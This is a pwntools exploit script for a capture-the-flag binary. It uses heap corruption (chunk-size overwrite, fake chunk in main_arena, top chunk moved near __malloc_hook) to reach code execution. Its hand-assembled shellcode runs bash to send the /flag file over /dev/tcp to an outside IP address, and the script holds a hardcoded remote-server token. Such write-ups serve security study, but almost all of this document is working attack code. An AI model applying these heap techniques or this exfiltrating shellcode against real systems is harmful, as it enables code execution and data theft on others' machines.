from pwn import *
import base64
local = 1
elf=ELF("./pwn")
context.terminal=["tmux","splitw","-h"]
#context.log_level="debug"
string=""
if local:
    a=process("./pwn")
    #libc=ELF("")
else:
    a=remote("df0a72047d6c.gamectf.com",10001)
    a.recvuntil("Please input you token:\n")
    a.sendline("icq408976346d6c2ca168bdc7d9397aa")
    #libc=ELF("")
def debug():
    gdb.attach(a,'''
    set $arena=0x80EA520
    set $hook=0x80EA4D8
    b *0x8048973
    b *0x80489AF
    b *0x8048A51
    b *0x8048ACF
    ''')
def menu(idx):
    #a.recvuntil("")
    global string
    a.sendline(str(idx))
    string+=str(idx)+'\n'
def add(size,content):
    global string
    menu(1)
    a.sendline(str(size))
    a.send(content)
    string+=str(size)+'\n'+content
def delete(idx):
    global string
    menu(2)
    a.sendline(str(idx))
    string+=str(idx)+'\n'
def edit(idx,content):
    global string
    menu(3)
    a.sendline(str(idx))
    string+=str(idx)+'\n'+content
    a.send(content)

a.recvuntil("You know all, Please input:\n")
add(0x34,'A'*0x34)#0
edit(0,'A'*0x34)

__malloc_hook=0x80EA4D8
__free_hook=0x80EB4F0
main_arena=0x80EA520
add(0x30-4,'A\n')#1
add(0x30-4,'A\n')#2
add(0x40-4,'A\n')#3
add(0x30-4,'A\n')#4
edit(0,'A'*0x34+'\xa1\n')
delete(1)
add(0x30-4,'A\n')#1
add(0x30-4,'A\n')#5 = 2
add(0x40-4,'A\n')#6 = 3
delete(5)
edit(2,p32(0x41)+'AAAAAAAAAAAAA\n')
add(0x30-4,'A\n')#5 
fake_chunk=main_arena+5*4
fake_top_chunk=__malloc_hook-0x20
delete(6)
edit(3,p32(fake_chunk)+'AAAAAA\n')
add(0x40-4,'A\n')
add(0x40-4,'\x00'*20+p32(fake_top_chunk)+'\n')#get fake chunk, modify top chunk

shellcode = '''
// bin sh
    push 0
    push 0x0068732f
    push 0x6e69622f
// -c 
    push 0x632d

    push 0
    push 0x27303030
    push 0x312f3030
    push 0x312e3733
    push 0x312e3036
    push 0x312e3830
    push 0x312f7063
    push 0x742f7665
    push 0x642f203e
    push 0x2067616c
    push 0x662f2074
    push 0x61632720
    push 0x632d2068
    push 0x73616220

    lea ebx,[esp+56]
    lea ecx,[esp+60]
    lea edx,[esp]
    push 0
    push edx
    push ebx
    push ecx
    lea ecx,[esp]
    push 0x0068732f
    push 0x6e69622f
    lea ebx,[esp]
    mov eax,0x0b
    mov edx,0
    int 0x80
'''
shellcode=asm(shellcode)
add(0x100-4,'A'*24+p32(__malloc_hook+4)+shellcode+'\n')
#debug()
menu(1)
a.sendline(str(10))
string+=str(10)+'\n'
string=base64.b64encode(string)
fd=open("xxx","w+")
#string=base64.b64decode(string)
fd.write(string)

a.interactive()